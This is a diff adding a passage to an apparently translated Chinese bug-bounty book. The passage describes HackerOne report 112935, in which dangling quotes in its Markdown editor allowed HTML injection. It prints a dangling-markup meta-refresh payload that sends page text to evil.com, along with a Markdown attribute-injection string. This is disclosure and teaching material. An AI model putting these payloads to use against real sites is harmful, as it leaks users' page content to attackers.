@@ -68,3 +68,65 @@ This is a test
 >當你測試一個站點時，要檢查它如何處理不同類型的輸入，包括純文本和編碼文本。特別要注意一些接受 URI 編碼值，例如`%2f`>，並渲染其解碼值的站點，這裡是`/`。雖然我們不知道這個例子中，黑客在想什麼，它們可能嘗試了 URI 編碼限製字符，並註意到 Coinbase >會解碼它們。之後他們更一步 URL 編碼了所有字符。
 
 [http://quick-encoder.com/url](http://quick-encoder.com/url) 是一個不錯的 URL 編碼器。你在使用時會注意到，它告訴你非限製字符不需要編碼，並且提供了編碼 URL 安全字符的選項。這就是獲取用於 COinbase 的相同編碼字符串的方式
+
+---
+
+### 2. HackerOne 無意識 HTML 包含
+```
+難度：中
+URL：hackerone.com
+報告鏈接：https://hackerone.com/reports/112935
+報告日期：2016.1.26
+獎金：$500
+描述：
+```
+
+在讀完 Yahoo XSS 的描述（第七章示例四），我對文本編輯器中的 HTML 渲染測試產生了興
+<br>
+趣。這包含玩轉 HackerOne 的 Markdown 編輯器，在圖像標籤中輸入一些類似 ismap=
+<br>
+"yyy=xxx" 和 "'test" 的東西。這樣做的時候，我注意到，編輯器會在雙引號裡麵包含一個單
+<br>
+引號 - 這叫做懸置引號。
+<br>
+那個時候，我並沒有真正理解它的含義。我知道如果你在某個地方注入另一個單引號，兩個
+<br>
+引號就會被瀏覽器一起解析，瀏覽器會將它們之間的內容視為一個 HTML 元素，例如：
+<br>
+
+```html
+<h1>This is a test</h1><p class="some class">some content</p>'
+```
+使用這個例子，如果你打算注入一個 Meta 標籤：
+```html
+<meta http-equiv="refresh" content='0; url=https://evil.com/log.php?text=
+```
+瀏覽器會提交兩個引號之間的任何東西。<br />
+現在，結果是，這個已經在 HackerOne 的 #110578報告中由 intidc 公開。<br />
+看到它公開之後，我有一點失望。<br />
+根據 HackerOne，它們依賴於 Redcarpet（一個用於 Markdown 處理的 Ruby 庫）的實現，<br />
+來轉義任何 Markdown 輸入的 HTML 輸出，隨後它會通過 React 組件<br />
+的 dangerouslySetInnerHTML 直接傳遞給 HTML DOM（也就是頁面）。此外，React 是一個<br />
+JavaScript 庫，可用於動態更新 Web 頁面的內容，而不需要重新加載頁面。<br />
+DOM 指代用於有效 HTML 以及 格式良好的 XML 的應用程序接口。<br />
+本質上，根據維基百科，DOM 是跨平台並且語言無關的約定，用於展示 HTML、XHTML 和 XMl 中的對象，並與其交互。<br />
+在 HackerOne 的實現中，它們並沒有合理轉義 HTML 輸出，這會導致潛在的漏洞。<br />
+現在，也就是說，查看披露，我覺得我應該測試一下心得代碼。我返回並測試了這個：
+```html
+[test](http://www.torontowebsitedeveloper.com "test ismap="alert xss" yyy="test"\ ")
+```
+它會變成
+```html
+<a title="'test" ismap="alert xss" yyy="test" ' ref="http://www.toronotwebsi\ tede
+veloper.com">test</a>
+```
+你可以看到，我能夠將一堆 HTML 注入到 `<a>` 標籤中。<br />
+所以，HackerOne 回滾了該修復版本，並重新開始轉義單引號了。
+```
+重要結論
+僅僅是代碼被更新了，並不意味著一些東西修復了，而是還要測試一下。當部署了變更
+之後，同時意味著新的代碼也可能存在漏洞。
+此外，如果你覺得有什麼不對，一定要深入挖掘。我知道一開始的尾後引號可能是個問
+題，但是我不知道如何利用它，所以我停止了。我本應該繼續的。我實際上通過閱讀
+XSS Jigsaw 的 了解了 Meta 刷新利用。
+```
